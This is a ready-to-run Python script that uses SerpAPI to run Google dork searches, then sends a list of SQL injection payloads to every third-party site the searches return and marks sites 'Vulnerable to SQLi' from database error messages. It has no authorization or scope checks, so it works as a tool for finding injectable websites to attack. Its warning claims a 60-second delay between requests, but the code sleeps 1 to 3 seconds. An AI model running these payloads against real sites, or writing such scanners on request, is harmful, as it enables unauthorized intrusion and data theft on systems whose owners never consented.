#!/usr/bin/python3

import argparse
import requests
from bs4 import BeautifulSoup
import time
import random
import os
import sys
import concurrent.futures

# ANSI color codes for better readability
RED = "\33[91m"
BLUE = "\33[94m"
GREEN = "\033[32m"
YELLOW = "\033[93m"
CYAN = "\033[36m"
END = "\033[0m"

# function printing banner
def printBanner():
    banner = f"""
    ██████╗  ██████╗ ██████╗ ██╗  ██╗███████╗██╗███╗   ██╗██████╗ ███████╗██████╗ 
    ██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
    ██║  ██║██║   ██║██████╔╝█████╔╝ █████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
    ██║  ██║██║   ██║██╔══██╗██╔═██╗ ██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
    ██████╔╝╚██████╔╝██║  ██║██║  ██╗██║     ██║██║ ╚████║██████╔╝███████╗██║  ██║
    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
    """
    print(banner)
    print('\n')

# function performing Google search using SerpAPI
def performGoogleSearch(query, api_key):
    try:
        print(f"{CYAN}Performing Google search for: {query}{END}")
        params = {
            "engine": "google",
            "q": query,
            "api_key": api_key,
            "num": "10"
        }
        response = requests.get("https://serpapi.com/search", params=params)
        response.raise_for_status()
        search_results = response.json()
        result_urls = [result['link'] for result in search_results.get('organic_results', [])]
        unique_domains = set()
        filtered_urls = []
        for url in result_urls:
            domain = url.split('/')[2]
            if domain not in unique_domains:
                unique_domains.add(domain)
                filtered_urls.append(url)
        print(f"{GREEN}Found {len(filtered_urls)} unique URLs{END}")
        return filtered_urls
    except Exception as e:
        print(f"{RED}An error occurred while performing Google search: {str(e)}{END}")
        sys.exit()

# function checking SQLi vulnerability
def checkSQLi(url):
    payloads = [
        "' OR '1'='1",
        "-1' UNION SELECT 1,2,3--",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "-17'",
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR 1=1--",
        "' OR 'a'='a'",
        "' AND sleep(5)--",
        "' AND '1'='1' AND '1'='1",
        "' UNION SELECT null,null,null--",
        "' AND EXISTS(SELECT 1 FROM dual)--"
    ]
    try:
        for payload in payloads:
            r = requests.get(f"{url}{payload}", timeout=10)
            if any(keyword in r.text.lower() for keyword in ["syntax error", "mysql", "sql error", "warning: mysql", "unclosed quotation", "you have an error in your sql syntax", "sqlstate"]):
                return True
        return False
    except Exception as e:
        print(f"{RED}An error occurred while checking SQLi vulnerability: {str(e)}{END}")
        return False

# function cleaning output file
def cleanOutput():
    file_path = 'output.txt'
    if os.path.exists(file_path):
        os.remove(file_path)

# function writing URLs to output file
def writeOutput(url, is_vulnerable):
    file_path = 'output.txt'
    with open(file_path, 'a', encoding='utf-8') as output_file:
        if is_vulnerable:
            output_file.write(f'[+] {url} - Vulnerable to SQLi\n')
        else:
            output_file.write(f'[!] {url} - Not vulnerable\n')

# function to read dorks from file
def readDorksFromFile(filename):
    with open(filename, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines() if line.strip()]

# main
def main():
    parser = argparse.ArgumentParser(description='Google DorkFinder by hermione')
    parser.add_argument('-d', metavar='dork', help='enter custom Google dork', dest='dork', type=str)
    parser.add_argument('-o', action='store_true',  help='print to output.txt', dest='output')
    parser.add_argument('--api-key', metavar='apikey', help='enter your SerpAPI key', dest='api_key', type=str, required=True)
    parser.add_argument('--no-delay', action='store_true', help='disable delay between requests', dest='no_delay')
    parser.add_argument('--dork-file', metavar='dorkfile', help='path to dork list file', dest='dork_file', type=str)
    args = parser.parse_args()

    printBanner()
    print(f"\033[1m{YELLOW}[WARNING]{END}\033[0m \033[1mIt's very important not to stress the Google during usage of dork payloads. \nThat's why I cause about 60 seconds delay between requests. Just be patient...\033[0m")

    cleanOutput()

    dorks = []
    if args.dork_file:
        dorks = readDorksFromFile(args.dork_file)
    elif args.dork:
        dorks = [args.dork]

    def process_dork(dork):
        # Perform Google search for the provided dork
        result_urls = performGoogleSearch(dork, args.api_key)
        for index, url in enumerate(result_urls):
            print(f"{YELLOW}Processing URL {index + 1}/{len(result_urls)}: {url}{END}")
            # Check SQLi vulnerability
            is_vulnerable = checkSQLi(url)
            if is_vulnerable:
                print(f'{BLUE}[+]{END} {url}   {CYAN}======>{END}  {GREEN}Vulnerable to SQLi{END}')
            else:
                print(f'{BLUE}[!]{END} {url}   {CYAN}======>{END}  {RED}Not vulnerable{END}')
            if args.output:
                writeOutput(url, is_vulnerable)
            # delay between requests
            if not args.no_delay:
                print(f"{YELLOW}Sleeping for a while to avoid stressing Google...{END}")
                time.sleep(random.randint(1, 3))

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(process_dork, dorks)

# exception handling
try:
    main()
except KeyboardInterrupt:
    print(f'\n{RED}Interrupted by user{END}')
    exit()
